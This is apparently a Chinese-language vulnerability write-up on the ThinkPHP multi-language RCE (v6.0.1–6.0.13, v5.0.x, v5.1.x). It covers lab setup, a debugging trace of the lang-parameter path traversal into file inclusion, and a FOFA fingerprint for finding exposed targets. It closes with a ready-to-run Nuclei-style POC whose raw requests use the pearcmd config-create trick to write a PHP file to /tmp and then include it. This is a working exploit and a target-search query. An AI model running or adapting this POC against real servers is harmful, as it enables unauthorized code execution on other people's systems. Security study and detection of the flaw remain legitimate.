# Thinkphp 多语言 RCE

## 影响范围

Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x

## fofa指纹

```
header="think_lang"
```

## 漏洞描述

如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。

## 环境搭建

### thinkphp6 ，打开多语言功能

app/middleware.php: 

```php
<?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    \think\middleware\LoadLangPack::class,
    // Session初始化
    // \think\middleware\SessionInit::class
];
```

### thinkphp5 ，打开多语言功能

config/app.php
application/config.php

```php
'lang_switch_on'         => true
```

### 测试环境搭建

```bash
git clone https://github.com/top-think/think.git tp6
cd tp6
git checkout v6.0.12
```

更改 `composer.json` ，安装 `v6.0.12` ：

```json
"require": {
        "php": ">=7.2.5",
        "topthink/framework": "6.0.12",
        "topthink/think-orm": "^2.0"
},
```

```bash
composer install
```

然后打开多语言功能：app/middleware.php

```php

<?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    \think\middleware\LoadLangPack::class,
    // Session初始化
    // \think\middleware\SessionInit::class
];
```

启动docker

```bash
docker run -itd -p 1080:80 --name tp6 -v $PWD:/var/www/html php:7.4-apache
```

访问：

`http://192.168.1.128:1080/public/index.php`

## 调试

调试环境：windows ，php7.4，thinkphp6.0.13（调试环境用的另一个、不影响结果）

```
http://127.0.0.1/index.php?lang=../../../../../public/index
```

每个 middleware 的 `handle()` 函数都会被调用，这里断在 `LoadLangPack.php` 的 `handle()` ，直接在最开头调用 `$langset = $this->detect($request);` ：

![image-20221221114801906](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221114801906.png)

跟进`$this->detect($request)`，	发现是对langSet取值，

![image-20221221115109654](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221115109654.png)

91行，这里做了一个判断，我们可以不难发现这个`$this->config['allow_lang_list']` 默认是为空的，可以不用管，返回值就为这里的`$range`

![image-20221221115217996](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221115217996.png)

![image-20221221115337072](Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221115337072.png)

回到handle()，发现会只要不是与`$this->config['default_lang']` 默认触发会调用`$this->lang->switchLangSet($langset);` ，跟进调试

![image-20221221115558778](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221115558778.png)

在 135 行，`$this->load([ $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',])`，在这里就实现了文件包含

```php
$this->load([
            $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',
        ]);
```

在`$this->load([ $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',])`中，默认会走到`$this->parse($name)`

![image-20221221120750404](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221120750404.png)

如果是php文件直接就include的了

![image-20221221120935057](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221120935057.png)

![image-20221221121001328](image/Thinkphpv6.0.13%E5%A4%9A%E8%AF%AD%E8%A8%80Rce.assets/image-20221221121001328.png)



## POC

可以利用pearcmd 文件包含这个 trick ，可以参考 p 牛的文章：

https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp

```yaml
id: thinkphp-language-local-file-include
info:
  name: thinkphp-多语言-本地文件包含rce
  author: wjlin0
  severity: critical
  description: 如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。
  metadata:
    fofa-query: header="think_lang"
  reference:
    - https://tttang.com/archive/1865/#toc_thinkphp-6
    - https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp
  tags: rce,thinkphp,include
requests:
  - raw:
      - |+
        GET /index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo();?>+/tmp/admin.php HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

      - |+
        GET /index.php?lang=../../../../../../../../tmp/admin HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
           - PHP Version
      - type: word
        part: body
        words:
           - '#PEAR_Config'
      - type: status
        status:
           - 200
```

## 参考

[Thinkphp 多语言 RCE - 跳跳糖](https://tttang.com/archive/1865/#toc_thinkphp-5)

